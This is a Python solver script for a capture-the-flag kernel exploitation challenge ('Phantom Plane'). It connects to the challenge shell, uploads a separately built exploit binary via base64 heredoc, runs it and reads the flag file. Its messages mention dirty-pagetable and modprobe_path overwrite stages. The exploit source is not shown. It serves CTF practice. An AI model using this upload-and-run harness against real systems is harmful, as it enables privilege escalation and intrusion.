#!/usr/bin/env python3
import argparse
import base64
import os
import random
import re
import select
import socket
import subprocess
import sys
import tempfile
import textwrap
import time
from pathlib import Path


FLAG_PATTERNS = [
    rb"[A-Za-z0-9_]+\{[^\n\r\}]+\}",
    rb"flag\{[^\n\r\}]+\}",
]

BUILD_FLAGS = [
    "-O2",
    "-fno-builtin",
    "-nostdlib",
    "-static",
    "-fno-stack-protector",
    "-no-pie",
    "-s",
]

SCRIPT_DIR = Path(__file__).resolve().parent


class RemoteShell:
    def __init__(self, host: str, port: int):
        self.sock = socket.create_connection((host, port), timeout=10)
        self.sock.setblocking(False)
        self.capture = bytearray()

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def recv_once(self, timeout: float) -> bytes:
        r, _, _ = select.select([self.sock], [], [], max(timeout, 0.0))
        if not r:
            return b""
        try:
            return self.sock.recv(65536)
        except BlockingIOError:
            return b""

    def recv_until(self, needle: bytes, timeout: float) -> bytes:
        out = bytearray()
        end = time.time() + timeout
        while time.time() < end:
            chunk = self.recv_once(0.2)
            if chunk:
                out.extend(chunk)
                self.capture.extend(chunk)
                if needle in out:
                    break
        return bytes(out)

    def drain(self, timeout: float = 0.8) -> bytes:
        out = bytearray()
        end = time.time() + timeout
        while time.time() < end:
            chunk = self.recv_once(0.05)
            if chunk:
                out.extend(chunk)
                self.capture.extend(chunk)
        return bytes(out)

    def sync_shell(self, total_timeout: float = 60.0) -> None:
        deadline = time.time() + total_timeout
        while time.time() < deadline:
            marker = f"__SYNC_{random.getrandbits(32):08x}__".encode()
            self.send(b"\n")
            self.send(b"echo " + marker + b"\n")
            out = self.recv_until(marker, timeout=3.0)
            if marker in out:
                return
        raise TimeoutError("failed to sync shell")

    def run(self, cmd: str, timeout: float = 20.0):
        marker = f"__END_{random.getrandbits(32):08x}__"
        payload = cmd.rstrip("\n") + f"\necho {marker} $?\n"
        self.send(payload.encode())
        out = self.recv_until(marker.encode(), timeout=timeout)
        rc = None
        m = re.search(rb"__END_[0-9a-f]{8}__\s+(-?\d+)", out)
        if m:
            try:
                rc = int(m.group(1))
            except ValueError:
                rc = None
        return out, rc


def extract_flag(data: bytes):
    for pat in FLAG_PATTERNS:
        m = re.search(pat, data, re.IGNORECASE)
        if m:
            return m.group(0).decode(errors="ignore")
    return None


def build_upload_cmd(remote_b64_path: str, payload: bytes) -> str:
    b64 = base64.b64encode(payload).decode()
    wrapped = "\n".join(textwrap.wrap(b64, 768))
    return f"cat > {remote_b64_path} <<'EOF'\n{wrapped}\nEOF"


def try_build_exploit(source_path: Path):
    if not source_path.exists():
        return None

    out_path = Path(tempfile.gettempdir()) / f"phantom_pwn_{os.getpid()}"
    cmd = [os.environ.get("CC", "gcc")] + BUILD_FLAGS + ["-o", str(out_path), str(source_path)]

    try:
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
    except FileNotFoundError:
        return None

    if proc.returncode != 0 or not out_path.exists():
        sys.stdout.buffer.write(proc.stdout)
        sys.stdout.flush()
        return None

    try:
        out_path.chmod(0o755)
    except OSError:
        pass
    return out_path


def choose_payload(binary_path: Path, source_path: Path):
    built = try_build_exploit(source_path)
    if built:
        return built.read_bytes(), str(built)

    if not binary_path.exists():
        raise FileNotFoundError(f"missing payload binary: {binary_path}")
    return binary_path.read_bytes(), str(binary_path)


def run_one_attempt(host: str, port: int, payload: bytes, run_timeout: float):
    io = RemoteShell(host, port)
    try:
        banner = io.drain(1.0)
        if banner:
            sys.stdout.buffer.write(banner)
            sys.stdout.flush()

        io.sync_shell(total_timeout=90.0)

        io.run(build_upload_cmd("/tmp/exploit.b64", payload), timeout=45.0)
        io.run(
            "base64 -d /tmp/exploit.b64 > /tmp/exploit || /bin/busybox base64 -d /tmp/exploit.b64 > /tmp/exploit",
            timeout=20.0,
        )
        io.run("chmod +x /tmp/exploit", timeout=5.0)

        out1, _ = io.run("/tmp/exploit", timeout=run_timeout)
        sys.stdout.buffer.write(out1)
        sys.stdout.flush()

        out2, _ = io.run("cat /tmp/flag || cat /flag", timeout=10.0)
        sys.stdout.buffer.write(out2)
        sys.stdout.flush()

        merged = bytes(io.capture)
        return extract_flag(merged), merged
    finally:
        io.close()


def main():
    parser = argparse.ArgumentParser(description="Phantom Plane kernel pwn solver")
    parser.add_argument("host", nargs="?", default="chall.0xfun.org")
    parser.add_argument("port", nargs="?", type=int, default=29865)
    parser.add_argument("--binary", default=str(SCRIPT_DIR / "exploit"), help="fallback local exploit ELF")
    parser.add_argument("--source", default=str(SCRIPT_DIR / "exploit.c"), help="exploit source to auto-build first")
    parser.add_argument("--attempts", type=int, default=20, help="fresh remote attempts")
    parser.add_argument("--run-timeout", type=float, default=120.0, help="seconds for /tmp/exploit run")
    parser.add_argument("--delay", type=float, default=0.4, help="sleep between attempts")
    args = parser.parse_args()

    payload, chosen = choose_payload(Path(args.binary), Path(args.source))
    print(f"[*] using payload: {chosen}")
    print(f"[*] target: {args.host}:{args.port}")

    for i in range(1, args.attempts + 1):
        print(f"\n[*] attempt {i}/{args.attempts}")
        try:
            flag, merged = run_one_attempt(args.host, args.port, payload, args.run_timeout)
        except Exception as exc:
            print(f"[-] attempt error: {exc}")
            if i != args.attempts:
                time.sleep(args.delay)
            continue

        if flag:
            print(f"[+] FLAG: {flag}")
            return 0

        if b"modprobe trigger failed" in merged:
            print("[-] exploit reached overwrite stage but trigger failed; retrying fresh instance")
        elif b"failed to overwrite modprobe_path" in merged or b"failed to locate modprobe_path" in merged:
            print("[-] overwrite stage failed; retrying fresh instance")
        elif b"failed to get dirty pagetable" in merged:
            print("[-] dirty pagetable stage failed; retrying fresh instance")
        else:
            print("[-] no flag in this attempt; retrying")

        if i != args.attempts:
            time.sleep(args.delay)

    print("[-] all attempts exhausted")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
